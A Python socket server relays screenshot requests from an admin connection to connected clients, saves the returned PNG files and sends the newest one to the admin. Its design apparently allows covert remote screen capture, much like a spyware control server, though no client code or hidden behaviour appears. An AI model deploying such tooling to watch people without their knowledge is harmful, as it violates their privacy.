import socket
import hashlib
import threading
from datetime import datetime

class Server:
    def __init__(self, server_ip, admin_port, client_port):
        self.server_ip = server_ip
        self.admin_port = admin_port
        self.client_port = client_port

        # Initialize server sockets
        self.admin_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.admin_conn = None
        self.client_connections = {}
        self.client_ips = []

        # Bind sockets to ports
        self.admin_socket.bind((self.server_ip, self.admin_port))
        self.client_socket.bind((self.server_ip, self.client_port))

        # Listen for incoming connections
        self.admin_socket.listen(1)
        self.client_socket.listen(5)

        print(f"Server is listening for admin on port {self.admin_port}")
        print(f"Server is listening for clients on port {self.client_port}")

    def start(self):
        # Accept the admin connection
        self.admin_conn, _ = self.admin_socket.accept()
        print("Admin client connected")

        # Start threads for handling clients and the main loop
        threading.Thread(target=self.handle_client_connections, daemon=True).start()
        self.main_server_loop()

    def handle_client_connections(self):
        while True:
            try:
                conn, addr = self.client_socket.accept()
                self.client_ips.append(addr[0])
                self.client_connections[conn] = addr[0]
                print(f"New client connected from IP: {addr[0]}")
            except Exception as e:
                print(f"Error handling client connections: {e}")
                break

    def handle_client_screenshot(self, client_conn, data, client_ip):
        """Receive and save a screenshot from a client."""
        data = data.replace(b"PIC_START", b"")
        try:
            while True:
                chunk = client_conn.recv(4096)
                if b"PIC_END" in chunk:
                    data += chunk.replace(b"PIC_END", b"")
                    break
                data += chunk

            current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            filename = f"pic_{client_ip}_{current_time}.png"

            with open(filename, "wb") as f:
                f.write(data)

            print(f"Screenshot saved as {filename}")
            self.admin_conn.sendall(b"SCREENSHOT SAVED AT SERVER")

        except Exception as e:
            print(f"Error saving screenshot: {e}")
            self.admin_conn.sendall(b"Error: SCREENSHOT SAVING FAILED")

    def send_last_file(self):
        """Send the most recent file to the admin."""
        try:
            files = [f for f in os.listdir('.') if f.startswith('pic_') and f.endswith('.png')]
            if not files:
                self.admin_conn.sendall(b"Error: No files found on server.")
                return
            print ("sending the most recent screenshot file to the admin")
            last_file = max(files, key=os.path.getctime)
            with open(last_file, "rb") as f:
                data = f.read()

            checksum = hashlib.md5(data).hexdigest()
            print(f"Sending file of size {len(data)} bytes with checksum {checksum}")

            self.admin_conn.sendall(b"FILE_START")
            self.admin_conn.sendall(data)
            self.admin_conn.sendall(b"FILE_END")

            print(f"Sent file {last_file} to admin.")

        except Exception as e:
            print(f"Error sending last file: {e}")
            self.admin_conn.sendall(b"Error: Failed to send the last file.")

    def main_server_loop(self):
        while True:
            try:
                readable, _, _ = select.select([self.admin_conn] + list(self.client_connections.keys()), [], [], 1)

                if self.admin_conn in readable:
                    message = self.admin_conn.recv(1024).decode()
                    if not message:
                        print("Admin disconnected")
                        break

                    if message == "CLIENTLIST":
                        client_list = ", ".join(self.client_ips)
                        self.admin_conn.sendall(f"Connected Clients IPs: {client_list}".encode())

                    elif message == "LASTFILE":
                        self.send_last_file()

                    elif message.startswith("SCREENSHOT:"):
                        target_ip = message.split(":")[1].strip()
                        target_conn = next((conn for conn, ip in self.client_connections.items() if ip == target_ip), None)

                        if target_conn:
                            target_conn.sendall(b"SCREENSHOT")
                        else:
                            self.admin_conn.sendall(f"Error: Client with IP {target_ip} not found.".encode())

                for conn in list(self.client_connections.keys()):
                    if conn in readable:
                        data = conn.recv(1024)
                        msg = data.decode(errors='ignore')
                        if not msg:
                            print(f"{self.client_connections[conn]} disconnected")
                            self.client_ips.remove(self.client_connections[conn])
                            del self.client_connections[conn]
                            conn.close()
                            continue

                        if msg.startswith("PIC_START"):
                            self.handle_client_screenshot(conn, data, self.client_connections[conn])

            except Exception as e:
                print(f"Error in main server loop: {e}")
                break

        for conn in self.client_connections:
            conn.close()
        self.admin_conn.close()
        self.admin_socket.close()
        self.client_socket.close()

if __name__ == "__main__":
    import os
    import select

    server_ip = "192.168.1.25"
    admin_port = 5000
    client_port = 5001

    server = Server(server_ip, admin_port, client_port)
    server.start()
